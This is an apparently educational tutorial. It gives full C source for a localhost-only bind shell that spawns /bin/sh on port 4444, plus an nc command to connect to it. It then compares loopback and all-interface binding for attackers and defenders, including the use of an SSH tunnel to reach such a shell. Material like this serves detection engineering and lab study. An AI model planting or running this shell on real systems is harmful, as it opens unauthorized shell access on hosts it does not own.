# Localhost-Only Bind Shell in C

Below is a minimal bind shell that listens **only on 127.0.0.1:4444**. This is a defensive/educational example intended for use in a lab environment where you control both ends (e.g., testing detection rules, writing YARA/Sigma signatures, or studying how reverse-vs-bind shells behave on the wire).

```c
// bind_local.c — educational bind shell, localhost-only
// Build: gcc -O2 -o bind_local bind_local.c
// Use only on machines you own or have explicit permission to test.

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }

    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(4444);
    // Key line: bind to loopback ONLY, not INADDR_ANY.
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);   // 127.0.0.1

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }
    if (listen(s, 1) < 0) { perror("listen"); return 1; }

    int c = accept(s, NULL, NULL);
    if (c < 0) { perror("accept"); return 1; }

    // Wire the socket to stdin/stdout/stderr, then exec a shell.
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    execl("/bin/sh", "sh", NULL);
    perror("execl");
    return 1;
}
```

Connect from the same host with:

```sh
nc 127.0.0.1 4444
```

---

## Why localhost-only (`127.0.0.1`) vs `0.0.0.0` matters

The `sin_addr` field in `bind()` determines **which interfaces** the kernel will accept connections on. This is the single most security-relevant decision in a bind shell.

### `0.0.0.0` (INADDR_ANY)
- The socket is bound to **every interface** on the host: loopback, LAN NIC, Wi-Fi, VPN, docker0, etc.
- The service is reachable from **any host that can route to any of those addresses** — subject only to firewall rules.
- For a bind shell, this means **anyone on the network** who can reach the port and guesses it (or scans for it) gets a root/user shell. This is the classic "open bind shell" that gets you popped in minutes on a hostile network.
- It also shows up loudly in `ss -ltnp` as `0.0.0.0:4444`, and is trivially flagged by EDR, NIDS, and cloud security tooling.

### `127.0.0.1` (INADDR_LOOPBACK)
- The socket is bound **only to the loopback interface**. Packets arriving on `eth0`, `wlan0`, `tun0`, etc. destined for port 4444 are **not** delivered to this socket — the kernel treats them as having no listener (typically RST).
- Reachability is limited to **processes on the same host** (including ones in the same network namespace, or in another namespace that shares loopback — worth noting for container escapes).
- Even if the host has no firewall at all, the shell is **not exposed to the network**. This dramatically reduces blast radius.
- It's quieter: `ss` shows `127.0.0.1:4444`, which is less alarming than `0.0.0.0:4444` to a casual observer, though good tooling still flags any unexpected listener.

### Practical implications for defenders and testers
1. **Attackers use `0.0.0.0`** when they need remote access and are willing to accept the exposure risk; they use `127.0.0.1` when they already have a foothold (e.g., via SSH tunnel, port-forward, or another implant) and want to keep the shell off the wire.
2. **Defenders should alert on any new listener**, but `0.0.0.0` listeners are far higher priority. A bind shell on `127.0.0.1` is often paired with an SSH tunnel (`ssh -L 4444:127.0.0.1:4444 user@host`) or a reverse tunnel — so look for the tunnel too.
3. **Firewalls are not a substitute for correct binding.** Binding to loopback is defense-in-depth: it works even when the firewall is misconfigured, disabled, or bypassed by a co-located container.
4. **Namespace caveat:** `127.0.0.1` is per-network-namespace. A container's `127.0.0.1` is not the host's `127.0.0.1`. If the shell runs in a container with `--network=host`, it *is* on the host's loopback. This is a common source of "but I bound to localhost!" surprises.

### Summary
| Bind address | Reachable from | Risk |
|---|---|---|
| `0.0.0.0` | Any routable interface | High — network-wide exposure |
| `127.0.0.1` | Same host / same netns | Low — local-only, still detectable |

If you're building this for a CTF, red-team lab, or detection-engineering exercise, **always bind to `127.0.0.1`** unless you specifically need to demonstrate the exposed variant — and never run it on a machine you don't own or lack written authorization to test.